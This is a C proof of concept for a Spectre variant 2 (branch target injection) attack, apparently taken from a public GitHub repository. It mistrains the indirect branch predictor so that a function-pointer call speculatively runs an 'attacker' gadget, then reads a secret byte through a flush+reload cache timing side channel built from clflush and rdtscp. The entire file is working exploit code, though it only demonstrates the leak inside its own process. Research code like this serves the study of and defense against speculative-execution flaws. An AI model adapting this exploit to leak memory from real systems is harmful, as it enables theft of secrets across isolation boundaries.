//! source: https://github.com/Anton-Cao/spectrev2-poc/
#include <stdint.h>
#include <x86intrin.h>
#include <stdio.h>


// attempt to execute btb attack without direct assembly call in victim

size_t pagesize = 4096;
int (*fp1)(char *info);
int (**fp2)(char *info);
char *probe_buf;
int junk;

int attacker(char *info){
    return probe_buf[*info * pagesize];
}

int safe(){
    return 42;
}

void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }

// ---------------------------------------------------------------------------
void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

int victim(char *info, int input){
    int junk = 0;
    for (int i =0; i < 100; i++){
        input += i;
        junk += input & i;
    }

    int result = 0;
    _mm_mfence(); // removing the fence breaks attack???
    result = (*fp2)(info);
    

    return result;
}

int flush_reload_t(void *ptr) {
  register uint64_t start = 0, end = 0;
  start = __rdtscp(&junk);
  maccess(ptr);

  end = __rdtscp(&junk);
  flush(ptr);

  return (int)(end - start);
}

void main(){
    int junk = 0;
    int j,k;
    char trash = '#';
    int i = 0;
    probe_buf = malloc(256 * pagesize);
    int hits[256];

    char target = 'C';
    int mix_i;
    int start, end;
    char *addr;

    for (i = 0; i < 256; i++) {
        hits[i] = 0;
    }

    
    for (int tries = 19; tries > 0; tries--){
        fp1 = &attacker;
        fp2 = &fp1;
        
        _mm_mfence();
        for (i = 0; i < 50; i++){
            junk ^= victim(&trash,0);
        }
        

        _mm_mfence();

        for (i = 0; i < 256; i++){
            _mm_clflush(probe_buf + i*pagesize);
        }

        _mm_mfence();
        fp1 = &safe;
        fp2 = &fp1;
        _mm_mfence();

        _mm_clflush((void*)fp1);
        _mm_clflush((void*)fp2);
        _mm_mfence();
        junk ^= victim(&target,0);
        //junk ^= probe_buf[90*pagesize];
        _mm_mfence();
        
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            if (flush_reload_t(probe_buf + mix_i * pagesize) <= 80){
                hits[mix_i]++;
            }
        }
    }

    // locate top two results
    j = k = -1;
    for (i = 0; i < 256; i++) {
        if (j < 0 || hits[i] >= hits[j]) {
            k = j;
            j = i;
        } else if (k < 0 || hits[i] >= hits[k]) {
            k = i;
        }
    }
    /* if ((hits[j] >= 2 * hits[k] + 5) ||
        (hits[j] == 2 && hits[k] == 0)) {
        break;
    } */

    printf("%d\n",junk);
    printf("j,hits[j]: %c,%d\n",j,hits[j]);
    free(probe_buf);
}